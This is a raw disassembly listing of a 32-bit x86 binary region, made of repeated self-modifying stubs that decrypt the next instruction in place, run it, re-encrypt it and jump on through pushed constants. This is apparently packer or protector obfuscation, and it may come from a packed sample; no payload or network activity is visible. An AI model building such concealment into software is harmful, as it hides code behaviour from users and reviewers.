  40929a:	c3                   	ret
  40929b:	8f 05 c9 92 40 00    	pop    0x4092c9
  4092a1:	50                   	push   %eax
  4092a2:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4092a8:	8d 80 53 e0 bf ff    	lea    -0x401fad(%eax),%eax
  4092ae:	87 05 b7 92 40 00    	xchg   %eax,0x4092b7
  4092b4:	58                   	pop    %eax
  4092b5:	f3 90                	pause
  4092b7:	f4                   	hlt
  4092b8:	63 a1 7a c0 50 66    	arpl   %esp,0x6650c07a(%ecx)
  4092be:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4092c3:	05 b7 92 40 00       	add    $0x4092b7,%eax
  4092c8:	b8 1f d0 4b 63       	mov    $0x634bd01f,%eax
  4092cd:	87 04 24             	xchg   %eax,(%esp)
  4092d0:	c3                   	ret
  4092d1:	8f 05 ff 92 40 00    	pop    0x4092ff
  4092d7:	50                   	push   %eax
  4092d8:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4092de:	8d 80 53 e0 bf ff    	lea    -0x401fad(%eax),%eax
  4092e4:	87 05 ed 92 40 00    	xchg   %eax,0x4092ed
  4092ea:	58                   	pop    %eax
  4092eb:	f3 90                	pause
  4092ed:	03 dd                	add    %ebp,%ebx
  4092ef:	ce                   	into
  4092f0:	74 40                	je     0x409332
  4092f2:	50                   	push   %eax
  4092f3:	66 b8 eb e8          	mov    $0xe8eb,%ax
  4092f7:	66 87 05 ed 92 40 00 	xchg   %ax,0x4092ed
  4092fe:	b8 2f 12 c6 7f       	mov    $0x7fc6122f,%eax
  409303:	87 04 24             	xchg   %eax,(%esp)
  409306:	c3                   	ret
  409307:	8f 05 35 93 40 00    	pop    0x409335
  40930d:	50                   	push   %eax
  40930e:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409314:	8d 80 53 60 c0 ff    	lea    -0x3f9fad(%eax),%eax
  40931a:	87 05 23 93 40 00    	xchg   %eax,0x409323
  409320:	58                   	pop    %eax
  409321:	f3 90                	pause
  409323:	7d 9a                	jge    0x4092bf
  409325:	93                   	xchg   %eax,%ebx
  409326:	ad                   	lods   %ds:(%esi),%eax
  409327:	00 50 66             	add    %dl,0x66(%eax)
  40932a:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40932f:	05 23 93 40 00       	add    $0x409323,%eax
  409334:	b8 45 f9 15 0a       	mov    $0xa15f945,%eax
  409339:	87 04 24             	xchg   %eax,(%esp)
  40933c:	c3                   	ret
  40933d:	8f 05 6b 93 40 00    	pop    0x40936b
  409343:	50                   	push   %eax
  409344:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40934a:	8d 80 53 e0 bf ff    	lea    -0x401fad(%eax),%eax
  409350:	87 05 59 93 40 00    	xchg   %eax,0x409359
  409356:	58                   	pop    %eax
  409357:	f3 90                	pause
  409359:	f7 3e                	idivl  (%esi)
  40935b:	f8                   	clc
  40935c:	09 c0                	or     %eax,%eax
  40935e:	50                   	push   %eax
  40935f:	66 b8 eb e8          	mov    $0xe8eb,%ax
  409363:	66 87 05 59 93 40 00 	xchg   %ax,0x409359
  40936a:	b8 7f 1a c9 27       	mov    $0x27c91a7f,%eax
  40936f:	87 04 24             	xchg   %eax,(%esp)
  409372:	c3                   	ret
  409373:	8f 05 a2 93 40 00    	pop    0x4093a2
  409379:	50                   	push   %eax
  40937a:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409380:	8d 80 ea f5 13 52    	lea    0x5213f5ea(%eax),%eax
  409386:	87 05 8f 93 40 00    	xchg   %eax,0x40938f
  40938c:	58                   	pop    %eax
  40938d:	f3 90                	pause
  40938f:	8a f8                	mov    %al,%bh
  409391:	ee                   	out    %al,(%dx)
  409392:	39 40 00             	cmp    %eax,0x0(%eax)
  409395:	50                   	push   %eax
  409396:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40939a:	66 87 05 8f 93 40 00 	xchg   %ax,0x40938f
  4093a1:	b8 44 bb 92 4d       	mov    $0x4d92bb44,%eax
  4093a6:	8d 40 01             	lea    0x1(%eax),%eax
  4093a9:	87 04 24             	xchg   %eax,(%esp)
  4093ac:	c3                   	ret
  4093ad:	8f 05 db 93 40 00    	pop    0x4093db
  4093b3:	50                   	push   %eax
  4093b4:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4093ba:	8d 80 53 60 c0 ff    	lea    -0x3f9fad(%eax),%eax
  4093c0:	87 05 c9 93 40 00    	xchg   %eax,0x4093c9
  4093c6:	58                   	pop    %eax
  4093c7:	f3 90                	pause
  4093c9:	2e c7 c2 aa 00 50 66 	cs mov $0x665000aa,%edx
  4093d0:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4093d5:	05 c9 93 40 00       	add    $0x4093c9,%eax
  4093da:	b8 16 3f 87 95       	mov    $0x95873f16,%eax
  4093df:	87 04 24             	xchg   %eax,(%esp)
  4093e2:	c3                   	ret
  4093e3:	8f 05 11 94 40 00    	pop    0x409411
  4093e9:	50                   	push   %eax
  4093ea:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4093f0:	8d 80 53 e0 bf ff    	lea    -0x401fad(%eax),%eax
  4093f6:	87 05 ff 93 40 00    	xchg   %eax,0x4093ff
  4093fc:	58                   	pop    %eax
  4093fd:	f3 90                	pause
  4093ff:	f6 bc 7d 2f 80 50 66 	idivb  0x6650802f(%ebp,%edi,2)
  409406:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40940b:	05 ff 93 40 00       	add    $0x4093ff,%eax
  409410:	b8 d9 48 f3 3c       	mov    $0x3cf348d9,%eax
  409415:	87 04 24             	xchg   %eax,(%esp)
  409418:	c3                   	ret
  409419:	8f 05 48 94 40 00    	pop    0x409448
  40941f:	50                   	push   %eax
  409420:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409426:	8d 80 ea f5 13 52    	lea    0x5213f5ea(%eax),%eax
  40942c:	87 05 35 94 40 00    	xchg   %eax,0x409435
  409432:	58                   	pop    %eax
  409433:	f3 90                	pause
  409435:	9d                   	popf
  409436:	67 17                	addr16 pop %ss
  409438:	0b 40 00             	or     0x0(%eax),%eax
  40943b:	50                   	push   %eax
  40943c:	66 b8 eb e8          	mov    $0xe8eb,%ax
  409440:	66 87 05 35 94 40 00 	xchg   %ax,0x409435
  409447:	b8 a7 45 46 e4       	mov    $0xe44645a7,%eax
  40944c:	8d 40 01             	lea    0x1(%eax),%eax
  40944f:	87 04 24             	xchg   %eax,(%esp)
  409452:	c3                   	ret
  409453:	8f 05 82 94 40 00    	pop    0x409482
  409459:	50                   	push   %eax
  40945a:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409460:	8d 80 7a e5 33 57    	lea    0x5733e57a(%eax),%eax
  409466:	87 05 6f 94 40 00    	xchg   %eax,0x40946f
  40946c:	58                   	pop    %eax
  40946d:	f3 90                	pause
  40946f:	49                   	dec    %ecx
  409470:	92                   	xchg   %eax,%edx
  409471:	b9 af 40 00 50       	mov    $0x500040af,%ecx
  409476:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40947a:	66 87 05 6f 94 40 00 	xchg   %ax,0x40946f
  409481:	b8 75 46 b8 23       	mov    $0x23b84675,%eax
  409486:	8d 40 01             	lea    0x1(%eax),%eax
  409489:	87 04 24             	xchg   %eax,(%esp)
  40948c:	c3                   	ret
  40948d:	8f 05 bb 94 40 00    	pop    0x4094bb
  409493:	50                   	push   %eax
  409494:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40949a:	8d 80 d3 02 50 ff    	lea    -0xaffd2d(%eax),%eax
  4094a0:	87 05 a9 94 40 00    	xchg   %eax,0x4094a9
  4094a6:	58                   	pop    %eax
  4094a7:	f3 90                	pause
  4094a9:	c2 3c 71             	ret    $0x713c
  4094ac:	95                   	xchg   %eax,%ebp
  4094ad:	ff 50 66             	call   *0x66(%eax)
  4094b0:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4094b5:	05 a9 94 40 00       	add    $0x4094a9,%eax
  4094ba:	b8 4e 28 bd 46       	mov    $0x46bd284e,%eax
  4094bf:	87 04 24             	xchg   %eax,(%esp)
  4094c2:	c3                   	ret
  4094c3:	8f 05 f2 94 40 00    	pop    0x4094f2
  4094c9:	50                   	push   %eax
  4094ca:	90                   	nop
  4094cb:	b8 15 20 40 00       	mov    $0x402015,%eax
  4094d0:	8d 80 76 ed 3b 57    	lea    0x573bed76(%eax),%eax
  4094d6:	87 05 df 94 40 00    	xchg   %eax,0x4094df
  4094dc:	58                   	pop    %eax
  4094dd:	f3 90                	pause
  4094df:	30 52 3b             	xor    %dl,0x3b(%edx)
  4094e2:	89 40 00             	mov    %eax,0x0(%eax)
  4094e5:	50                   	push   %eax
  4094e6:	66 b8 eb e8          	mov    $0xe8eb,%ax
  4094ea:	66 87 05 df 94 40 00 	xchg   %ax,0x4094df
  4094f1:	b8 de b6 86 f8       	mov    $0xf886b6de,%eax
  4094f6:	8d 40 01             	lea    0x1(%eax),%eax
  4094f9:	87 04 24             	xchg   %eax,(%esp)
  4094fc:	c3                   	ret
  4094fd:	8f 05 2b 95 40 00    	pop    0x40952b
  409503:	50                   	push   %eax
  409504:	90                   	nop
  409505:	b8 15 20 40 00       	mov    $0x402015,%eax
  40950a:	8d 80 d3 bd 5e ff    	lea    -0xa1422d(%eax),%eax
  409510:	87 05 19 95 40 00    	xchg   %eax,0x409519
  409516:	58                   	pop    %eax
  409517:	f3 90                	pause
  409519:	fa                   	cli
  40951a:	8c 33                	mov    %?,(%ebx)
  40951c:	57                   	push   %edi
  40951d:	ff 50 66             	call   *0x66(%eax)
  409520:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409525:	05 19 95 40 00       	add    $0x409519,%eax
  40952a:	b8 65 6a f8 a9       	mov    $0xa9f86a65,%eax
  40952f:	87 04 24             	xchg   %eax,(%esp)
  409532:	c3                   	ret
  409533:	8f 05 62 95 40 00    	pop    0x409562
  409539:	50                   	push   %eax
  40953a:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409540:	8d 80 ea f5 17 52    	lea    0x5217f5ea(%eax),%eax
  409546:	87 05 4f 95 40 00    	xchg   %eax,0x40954f
  40954c:	58                   	pop    %eax
  40954d:	f3 90                	pause
  40954f:	49                   	dec    %ecx
  409550:	c5 44 60 40          	lds    0x40(%eax,%eiz,2),%eax
  409554:	00 50 66             	add    %dl,0x66(%eax)
  409557:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40955c:	05 4f 95 40 00       	add    $0x40954f,%eax
  409561:	b8 0d ba 64 c1       	mov    $0xc164ba0d,%eax
  409566:	8d 40 01             	lea    0x1(%eax),%eax
  409569:	87 04 24             	xchg   %eax,(%esp)
  40956c:	c3                   	ret
  40956d:	8f 05 9b 95 40 00    	pop    0x40959b
  409573:	50                   	push   %eax
  409574:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40957a:	8d 80 d3 f2 4c ff    	lea    -0xb30d2d(%eax),%eax
  409580:	87 05 89 95 40 00    	xchg   %eax,0x409589
  409586:	58                   	pop    %eax
  409587:	f3 90                	pause
  409589:	97                   	xchg   %eax,%edi
  40958a:	52                   	push   %edx
  40958b:	2c 2d                	sub    $0x2d,%al
  40958d:	ff 50 66             	call   *0x66(%eax)
  409590:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409595:	05 89 95 40 00       	add    $0x409589,%eax
  40959a:	b8 1c 15 ae 03       	mov    $0x3ae151c,%eax
  40959f:	87 04 24             	xchg   %eax,(%esp)
  4095a2:	c3                   	ret
  4095a3:	8f 05 d2 95 40 00    	pop    0x4095d2
  4095a9:	50                   	push   %eax
  4095aa:	90                   	nop
  4095ab:	b8 15 20 40 00       	mov    $0x402015,%eax
  4095b0:	8d 80 ea f5 0b 52    	lea    0x520bf5ea(%eax),%eax
  4095b6:	87 05 bf 95 40 00    	xchg   %eax,0x4095bf
  4095bc:	58                   	pop    %eax
  4095bd:	f3 90                	pause
  4095bf:	14 57                	adc    $0x57,%al
  4095c1:	ae                   	scas   %es:(%edi),%al
  4095c2:	f4                   	hlt
  4095c3:	40                   	inc    %eax
  4095c4:	00 50 66             	add    %dl,0x66(%eax)
  4095c7:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4095cc:	05 bf 95 40 00       	add    $0x4095bf,%eax
  4095d1:	b8 df 7e 5d 3e       	mov    $0x3e5d7edf,%eax
  4095d6:	8d 40 01             	lea    0x1(%eax),%eax
  4095d9:	87 04 24             	xchg   %eax,(%esp)
  4095dc:	c3                   	ret
  4095dd:	8f 05 0c 96 40 00    	pop    0x40960c
  4095e3:	50                   	push   %eax
  4095e4:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4095ea:	8d 80 fa 63 c9 80    	lea    -0x7f369c06(%eax),%eax
  4095f0:	87 05 f9 95 40 00    	xchg   %eax,0x4095f9
  4095f6:	58                   	pop    %eax
  4095f7:	f3 90                	pause
  4095f9:	e6 13                	out    %al,$0x13
  4095fb:	09 a0 ff ff 50 66    	or     %esp,0x6650ffff(%eax)
  409601:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409606:	05 f9 95 40 00       	add    $0x4095f9,%eax
  40960b:	b8 87 d2 a9 f0       	mov    $0xf0a9d287,%eax
  409610:	8d 40 01             	lea    0x1(%eax),%eax
  409613:	87 04 24             	xchg   %eax,(%esp)
  409616:	c3                   	ret
  409617:	8f 05 45 96 40 00    	pop    0x409645
  40961d:	50                   	push   %eax
  40961e:	90                   	nop
  40961f:	b8 15 20 40 00       	mov    $0x402015,%eax
  409624:	8d 80 d3 e8 60 ff    	lea    -0x9f172d(%eax),%eax
  40962a:	87 05 33 96 40 00    	xchg   %eax,0x409633
  409630:	58                   	pop    %eax
  409631:	f3 90                	pause
  409633:	8f                   	(bad)
  409634:	21 84 04 ff 50 66 b8 	and    %eax,-0x4799af01(%esp,%eax,1)
  40963b:	eb e8                	jmp    0x409625
  40963d:	66 87 05 33 96 40 00 	xchg   %ax,0x409633
  409644:	b8 b8 1c fd 21       	mov    $0x21fd1cb8,%eax
  409649:	87 04 24             	xchg   %eax,(%esp)
  40964c:	c3                   	ret
  40964d:	8f 05 7c 96 40 00    	pop    0x40967c
  409653:	50                   	push   %eax
  409654:	90                   	nop
  409655:	b8 15 20 40 00       	mov    $0x402015,%eax
  40965a:	8d 80 76 ed 5f 57    	lea    0x575fed76(%eax),%eax
  409660:	87 05 69 96 40 00    	xchg   %eax,0x409669
  409666:	58                   	pop    %eax
  409667:	f3 90                	pause
  409669:	fc                   	cld
  40966a:	7a 33                	jp     0x40969f
  40966c:	1f                   	pop    %ds
  40966d:	40                   	inc    %eax
  40966e:	00 50 66             	add    %dl,0x66(%eax)
  409671:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409676:	05 69 96 40 00       	add    $0x409669,%eax
  40967b:	b8 c2 b0 bb ca       	mov    $0xcabbb0c2,%eax
  409680:	8d 40 01             	lea    0x1(%eax),%eax
  409683:	87 04 24             	xchg   %eax,(%esp)
  409686:	c3                   	ret
  409687:	8f 05 b6 96 40 00    	pop    0x4096b6
  40968d:	50                   	push   %eax
  40968e:	90                   	nop
  40968f:	b8 15 20 40 00       	mov    $0x402015,%eax
  409694:	8d 80 ea f5 07 52    	lea    0x5207f5ea(%eax),%eax
  40969a:	87 05 a3 96 40 00    	xchg   %eax,0x4096a3
  4096a0:	58                   	pop    %eax
  4096a1:	f3 90                	pause
  4096a3:	f9                   	stc
  4096a4:	1c ac                	sbb    $0xac,%al
  4096a6:	01 40 00             	add    %eax,0x0(%eax)
  4096a9:	50                   	push   %eax
  4096aa:	66 b8 eb e8          	mov    $0xe8eb,%ax
  4096ae:	66 87 05 a3 96 40 00 	xchg   %ax,0x4096a3
  4096b5:	b8 85 e2 e4 7f       	mov    $0x7fe4e285,%eax
  4096ba:	8d 40 01             	lea    0x1(%eax),%eax
  4096bd:	87 04 24             	xchg   %eax,(%esp)
  4096c0:	c3                   	ret
  4096c1:	8f 05 ef 96 40 00    	pop    0x4096ef
  4096c7:	50                   	push   %eax
  4096c8:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4096ce:	8d 80 d3 3e 60 ff    	lea    -0x9fc12d(%eax),%eax
  4096d4:	87 05 dd 96 40 00    	xchg   %eax,0x4096dd
  4096da:	58                   	pop    %eax
  4096db:	f3 90                	pause
  4096dd:	65 f0 60             	gs lock pusha
  4096e0:	0a ff                	or     %bh,%bh
  4096e2:	50                   	push   %eax
  4096e3:	66 b8 eb e8          	mov    $0xe8eb,%ax
  4096e7:	66 87 05 dd 96 40 00 	xchg   %ax,0x4096dd
  4096ee:	b8 d5 2c bd 7a       	mov    $0x7abd2cd5,%eax
  4096f3:	87 04 24             	xchg   %eax,(%esp)
  4096f6:	c3                   	ret
  4096f7:	8f 05 25 97 40 00    	pop    0x409725
  4096fd:	50                   	push   %eax
  4096fe:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409704:	8d 80 d3 08 60 ff    	lea    -0x9ff72d(%eax),%eax
  40970a:	87 05 13 97 40 00    	xchg   %eax,0x409713
  409710:	58                   	pop    %eax
  409711:	f3 90                	pause
  409713:	1a ea                	sbb    %dl,%ch
  409715:	94                   	xchg   %eax,%esp
  409716:	b3 ff                	mov    $0xff,%bl
  409718:	50                   	push   %eax
  409719:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40971d:	66 87 05 13 97 40 00 	xchg   %ax,0x409713
  409724:	b8 12 1f 5c eb       	mov    $0xeb5c1f12,%eax
  409729:	87 04 24             	xchg   %eax,(%esp)
  40972c:	c3                   	ret
  40972d:	8f 05 5b 97 40 00    	pop    0x40975b
  409733:	50                   	push   %eax
  409734:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40973a:	8d 80 6e 34 e4 03    	lea    0x3e4346e(%eax),%eax
  409740:	87 05 49 97 40 00    	xchg   %eax,0x409749
  409746:	58                   	pop    %eax
  409747:	f3 90                	pause
  409749:	06                   	push   %es
  40974a:	e3 f1                	jecxz  0x40973d
  40974c:	4d                   	dec    %ebp
  40974d:	00 50 66             	add    %dl,0x66(%eax)
  409750:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409755:	05 49 97 40 00       	add    $0x409749,%eax
  40975a:	b8 c0 8a 3d 5c       	mov    $0x5c3d8ac0,%eax
  40975f:	87 04 24             	xchg   %eax,(%esp)
  409762:	c3                   	ret
  409763:	8f 05 91 97 40 00    	pop    0x409791
  409769:	50                   	push   %eax
  40976a:	90                   	nop
  40976b:	b8 15 20 40 00       	mov    $0x402015,%eax
  409770:	8d 80 a3 e1 bf ff    	lea    -0x401e5d(%eax),%eax
  409776:	87 05 7f 97 40 00    	xchg   %eax,0x40977f
  40977c:	58                   	pop    %eax
  40977d:	f3 90                	pause
  40977f:	55                   	push   %ebp
  409780:	53                   	push   %ebx
  409781:	36 a8 00             	ss test $0x0,%al
  409784:	50                   	push   %eax
  409785:	66 b8 eb e8          	mov    $0xe8eb,%ax
  409789:	66 87 05 7f 97 40 00 	xchg   %ax,0x40977f
  409790:	b8 19 e1 bc 44       	mov    $0x44bce119,%eax
  409795:	87 04 24             	xchg   %eax,(%esp)
  409798:	c3                   	ret
  409799:	8f 05 c8 97 40 00    	pop    0x4097c8
  40979f:	50                   	push   %eax
  4097a0:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4097a6:	8d 80 fa 64 f8 7e    	lea    0x7ef864fa(%eax),%eax
  4097ac:	87 05 b5 97 40 00    	xchg   %eax,0x4097b5
  4097b2:	58                   	pop    %eax
  4097b3:	f3 90                	pause
  4097b5:	6b d0 6d             	imul   $0x6d,%eax,%edx
  4097b8:	23 ff                	and    %edi,%edi
  4097ba:	ff 50 66             	call   *0x66(%eax)
  4097bd:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4097c2:	05 b5 97 40 00       	add    $0x4097b5,%eax
  4097c7:	b8 fb 45 64 02       	mov    $0x26445fb,%eax
  4097cc:	8d 40 01             	lea    0x1(%eax),%eax
  4097cf:	87 04 24             	xchg   %eax,(%esp)
  4097d2:	c3                   	ret
  4097d3:	8f 05 02 98 40 00    	pop    0x409802
  4097d9:	50                   	push   %eax
  4097da:	90                   	nop
  4097db:	b8 15 20 40 00       	mov    $0x402015,%eax
  4097e0:	8d 80 fa 64 cc 7c    	lea    0x7ccc64fa(%eax),%eax
  4097e6:	87 05 ef 97 40 00    	xchg   %eax,0x4097ef
  4097ec:	58                   	pop    %eax
  4097ed:	f3 90                	pause
  4097ef:	e3 76                	jecxz  0x409867
  4097f1:	9b                   	fwait
  4097f2:	83 ff ff             	cmp    $0xffffffff,%edi
  4097f5:	50                   	push   %eax
  4097f6:	66 b8 eb e8          	mov    $0xe8eb,%ax
  4097fa:	66 87 05 ef 97 40 00 	xchg   %ax,0x4097ef
  409801:	b8 91 03 ef 52       	mov    $0x52ef0391,%eax
  409806:	8d 40 01             	lea    0x1(%eax),%eax
  409809:	87 04 24             	xchg   %eax,(%esp)
  40980c:	c3                   	ret
  40980d:	8f 05 3b 98 40 00    	pop    0x40983b
  409813:	50                   	push   %eax
  409814:	90                   	nop
  409815:	b8 15 20 40 00       	mov    $0x402015,%eax
  40981a:	8d 80 d3 92 4a ff    	lea    -0xb56d2d(%eax),%eax
  409820:	87 05 29 98 40 00    	xchg   %eax,0x409829
  409826:	58                   	pop    %eax
  409827:	f3 90                	pause
  409829:	99                   	cltd
  40982a:	2b 84 fb ff 50 66 b8 	sub    -0x4799af01(%ebx,%edi,8),%eax
  409831:	eb e8                	jmp    0x40981b
  409833:	66 87 05 29 98 40 00 	xchg   %ax,0x409829
  40983a:	b8 3d cb c3 a3       	mov    $0xa3c3cb3d,%eax
  40983f:	87 04 24             	xchg   %eax,(%esp)
  409842:	c3                   	ret
  409843:	8f 05 71 98 40 00    	pop    0x409871
  409849:	50                   	push   %eax
  40984a:	90                   	nop
  40984b:	b8 15 20 40 00       	mov    $0x402015,%eax
  409850:	8d 80 8c 5c 17 40    	lea    0x40175c8c(%eax),%eax
  409856:	87 05 5f 98 40 00    	xchg   %eax,0x40985f
  40985c:	58                   	pop    %eax
  40985d:	f3 90                	pause
  40985f:	1b 7f 39             	sbb    0x39(%edi),%edi
  409862:	09 00                	or     %eax,(%eax)
  409864:	50                   	push   %eax
  409865:	66 b8 eb e8          	mov    $0xe8eb,%ax
  409869:	66 87 05 5f 98 40 00 	xchg   %ax,0x40985f
  409870:	b8 1f c2 43 2d       	mov    $0x2d43c21f,%eax
  409875:	87 04 24             	xchg   %eax,(%esp)
  409878:	c3                   	ret
  409879:	8f 05 a7 98 40 00    	pop    0x4098a7
  40987f:	50                   	push   %eax
  409880:	90                   	nop
  409881:	b8 15 20 40 00       	mov    $0x402015,%eax
  409886:	8d 80 d3 41 5b ff    	lea    -0xa4be2d(%eax),%eax
  40988c:	87 05 95 98 40 00    	xchg   %eax,0x409895
  409892:	58                   	pop    %eax
  409893:	f3 90                	pause
  409895:	45                   	inc    %ebp
  409896:	ea b8 c7 ff 50 66 b8 	ljmp   $0xb866,$0x50ffc7b8
  40989d:	eb e8                	jmp    0x409887
  40989f:	66 87 05 95 98 40 00 	xchg   %ax,0x409895
  4098a6:	b8 8d 59 5e be       	mov    $0xbe5e598d,%eax
  4098ab:	87 04 24             	xchg   %eax,(%esp)
  4098ae:	c3                   	ret
  4098af:	8f 05 de 98 40 00    	pop    0x4098de
  4098b5:	50                   	push   %eax
  4098b6:	90                   	nop
  4098b7:	b8 15 20 40 00       	mov    $0x402015,%eax
  4098bc:	8d 80 ea f5 0f 52    	lea    0x520ff5ea(%eax),%eax
  4098c2:	87 05 cb 98 40 00    	xchg   %eax,0x4098cb
  4098c8:	58                   	pop    %eax
  4098c9:	f3 90                	pause
  4098cb:	e1 73                	loope  0x409940
  4098cd:	6d                   	insl   (%dx),%es:(%edi)
  4098ce:	9e                   	sahf
  4098cf:	40                   	inc    %eax
  4098d0:	00 50 66             	add    %dl,0x66(%eax)
  4098d3:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4098d8:	05 cb 98 40 00       	add    $0x4098cb,%eax
  4098dd:	b8 8b 9a 4a d2       	mov    $0xd24a9a8b,%eax
  4098e2:	8d 40 01             	lea    0x1(%eax),%eax
  4098e5:	87 04 24             	xchg   %eax,(%esp)
  4098e8:	c3                   	ret
  4098e9:	8f 05 18 99 40 00    	pop    0x409918
  4098ef:	50                   	push   %eax
  4098f0:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4098f6:	8d 80 76 ed 3b 57    	lea    0x573bed76(%eax),%eax
  4098fc:	87 05 05 99 40 00    	xchg   %eax,0x409905
  409902:	58                   	pop    %eax
  409903:	f3 90                	pause
  409905:	b5 38                	mov    $0x38,%ch
  409907:	0a f4                	or     %ah,%dh
  409909:	40                   	inc    %eax
  40990a:	00 50 66             	add    %dl,0x66(%eax)
  40990d:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409912:	05 05 99 40 00       	add    $0x409905,%eax
  409917:	b8 04 0a 18 02       	mov    $0x2180a04,%eax
  40991c:	8d 40 01             	lea    0x1(%eax),%eax
  40991f:	87 04 24             	xchg   %eax,(%esp)
  409922:	c3                   	ret
  409923:	8f 05 51 99 40 00    	pop    0x409951
  409929:	50                   	push   %eax
  40992a:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409930:	8d 80 d3 c2 5a ff    	lea    -0xa53d2d(%eax),%eax
  409936:	87 05 3f 99 40 00    	xchg   %eax,0x40993f
  40993c:	58                   	pop    %eax
  40993d:	f3 90                	pause
  40993f:	41                   	inc    %ecx
  409940:	b2 34                	mov    $0x34,%dl
  409942:	db ff                	(bad)
  409944:	50                   	push   %eax
  409945:	66 b8 eb e8          	mov    $0xe8eb,%ax
  409949:	66 87 05 3f 99 40 00 	xchg   %ax,0x40993f
  409950:	b8 81 ea 62 8e       	mov    $0x8e62ea81,%eax
  409955:	87 04 24             	xchg   %eax,(%esp)
  409958:	c3                   	ret
  409959:	8f 05 87 99 40 00    	pop    0x409987
  40995f:	50                   	push   %eax
  409960:	90                   	nop
  409961:	b8 15 20 40 00       	mov    $0x402015,%eax
  409966:	8d 80 d3 06 49 ff    	lea    -0xb6f92d(%eax),%eax
  40996c:	87 05 75 99 40 00    	xchg   %eax,0x409975
  409972:	58                   	pop    %eax
  409973:	f3 90                	pause
  409975:	a0 f4 51 da ff       	mov    0xffda51f4,%al
  40997a:	50                   	push   %eax
  40997b:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40997f:	66 87 05 75 99 40 00 	xchg   %ax,0x409975
  409986:	b8 04 e3 ef 81       	mov    $0x81efe304,%eax
  40998b:	87 04 24             	xchg   %eax,(%esp)
  40998e:	c3                   	ret
  40998f:	8f 05 be 99 40 00    	pop    0x4099be
  409995:	50                   	push   %eax
  409996:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40999c:	8d 80 76 f5 77 56    	lea    0x5677f576(%eax),%eax
  4099a2:	87 05 ab 99 40 00    	xchg   %eax,0x4099ab
  4099a8:	58                   	pop    %eax
  4099a9:	f3 90                	pause
  4099ab:	3c b0                	cmp    $0xb0,%al
  4099ad:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4099ae:	77 40                	ja     0x4099f0
  4099b0:	00 50 66             	add    %dl,0x66(%eax)
  4099b3:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4099b8:	05 ab 99 40 00       	add    $0x4099ab,%eax
  4099bd:	b8 a9 45 17 60       	mov    $0x601745a9,%eax
  4099c2:	8d 40 01             	lea    0x1(%eax),%eax
  4099c5:	87 04 24             	xchg   %eax,(%esp)
  4099c8:	c3                   	ret
  4099c9:	8f 05 f8 99 40 00    	pop    0x4099f8
  4099cf:	50                   	push   %eax
  4099d0:	90                   	nop
  4099d1:	b8 15 20 40 00       	mov    $0x402015,%eax
  4099d6:	8d 80 ea f5 07 52    	lea    0x5207f5ea(%eax),%eax
  4099dc:	87 05 e5 99 40 00    	xchg   %eax,0x4099e5
  4099e2:	58                   	pop    %eax
  4099e3:	f3 90                	pause
  4099e5:	f7 73 b5             	divl   -0x4b(%ebx)
  4099e8:	bf 40 00 50 66       	mov    $0x66500040,%edi
  4099ed:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4099f2:	05 e5 99 40 00       	add    $0x4099e5,%eax
  4099f7:	b8 61 21 a8 af       	mov    $0xafa82161,%eax
  4099fc:	8d 40 01             	lea    0x1(%eax),%eax
  4099ff:	87 04 24             	xchg   %eax,(%esp)
  409a02:	c3                   	ret
  409a03:	8f 05 31 9a 40 00    	pop    0x409a31
  409a09:	50                   	push   %eax
  409a0a:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409a10:	8d 80 d3 ac 4b ff    	lea    -0xb4532d(%eax),%eax
  409a16:	87 05 1f 9a 40 00    	xchg   %eax,0x409a1f
  409a1c:	58                   	pop    %eax
  409a1d:	f3 90                	pause
  409a1f:	6e                   	outsb  %ds:(%esi),(%dx)
  409a20:	39 52 c8             	cmp    %edx,-0x38(%edx)
  409a23:	ff 50 66             	call   *0x66(%eax)
  409a26:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  409a2b:	05 1f 9a 40 00       	add    $0x409a1f,%eax
  409a30:	b8 9c 32 a0 fa       	mov    $0xfaa0329c,%eax
  409a35:	87 04 24             	xchg   %eax,(%esp)
  409a38:	c3                   	ret
  409a39:	8f 05 68 9a 40 00    	pop    0x409a68
  409a3f:	50                   	push   %eax
  409a40:	8b 05 06 71 40 00    	mov    0x407106,%eax
  409a46:	8d 80 76 ed 3b 57    	lea    0x573bed76(%eax),%eax
  409a4c:	87 05 55 9a 40 00    	xchg   %eax,0x409a55
